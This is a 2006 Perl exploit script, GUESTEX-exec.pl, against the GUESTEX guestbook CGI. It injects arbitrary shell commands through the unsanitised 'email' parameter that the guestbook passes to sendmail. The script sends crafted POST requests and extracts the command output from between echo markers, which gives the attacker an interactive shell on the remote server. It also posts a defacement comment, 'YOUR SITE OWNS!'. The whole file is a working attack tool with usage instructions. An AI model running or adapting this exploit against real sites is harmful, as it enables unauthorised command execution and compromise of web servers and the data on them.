## Creator: K-sPecial (xzziroz.net) of .aware (awarenetwork.org)
## Name: GUESTEX-exec.pl
## Date: 06/07/2006
## Version: 1.00
##  1.00 (06/07/2006) - GUESTEX-exec.pl created
## 
## Description: GUESTEX guestbook is vulnerable to remote code execution in how it 
##  handles it's 'email' parameter. $form{'email'} is used when openning a pipe to 
##  sendmail in this manner: open(MAIL, "$sendmail $form{'email'}) where $form{'email'} 
##  is not properly sanitized.
##
## Usage: specify the host and location of the script as the first argument. hosts can 
##  contain ports (host:port) and you CAN specify a single command to execute via the 
##  commandline, although if you do not you will be given a shell like interface to 
##  repeatedly enter commands.
#######################################################################################
use IO::Socket;
use strict;

my $host = $ARGV[0];
my $location = $ARGV[1];
my $command = $ARGV[2];
my $sock;
my $port = 80;
my $comment = $ARGV[3] || "YOUR SITE OWNS!\n";

if (!($host && $location)) { 
	die("-!> perl $0 <host[:port]> <location> [command] [comment]\n");
}

$port = $1  if ($host =~ m/:(\d+)/);

while (1) { 
	my $switch = 0;
	if (!($ARGV[2])) {
		Print 'guestex-shell$ ';
		chomp($command = <STDIN>);
	}

	my $cmd = ";echo --1337 start-- ;$command; echo --1337 end--";
	$cmd =~ s/(.)/sprintf("%%%x", ord($1))/ge;

	my $POST = "POST $location HTTP/1.1\r\n"  		             .
	           "Host: $host\r\n"                                         .
		   "User-Agent: mozilla\r\n"                                 .
	           "Content-type: application/x-www-form-urlencoded\r\n"     .
		   "Content-length: " . length("surname=ax0r&nationality=american&country of residence=USA&preview=no&action=add&name=ax0r&site=ax0r net&url=www.ax0r.net&location=atlanta,ga&rating=10&comment=$comment&email=ax0r\@yahoo.com$cmd") . "\r\n" . 
		   "Referer: $host\r\n\r\n";
	
	$POST .= "surname=ax0r&nationality=american&country of residence=USA&preview=no&action=add&name=ax0r&site=ax0r net&url=www.ax0r.net&location=atlanta,ga&rating=10&comment=$comment&email=ax0r\@yahoo.com$cmd";
	
	$sock = IO::Socket::INET->new('PeerAddr' => "$host",
        	                      'PeerPort' => $port,
                	              'Proto'    => 'tcp',
				      'Type'     => SOCK_STREAM) or die ("-!> unable to connect to '$host:$port': $!\n");

	$sock->autoflush();

	print $sock "$POST";

	#$switch = 1; # used for debugging if you think 'echo' might not be working, etc
	 
	while (my $line = <$sock>) {
		if ($line =~ m/^\-\-1337\ start\-\-$/) {
			$switch = 1;
			next;
		}
		if ($line =~ m/^\-\-1337\ end\-\-$/) {
			close($sock);
			last;
		}
		print $line if $switch;
	}
	exit if $ARGV[2];
}
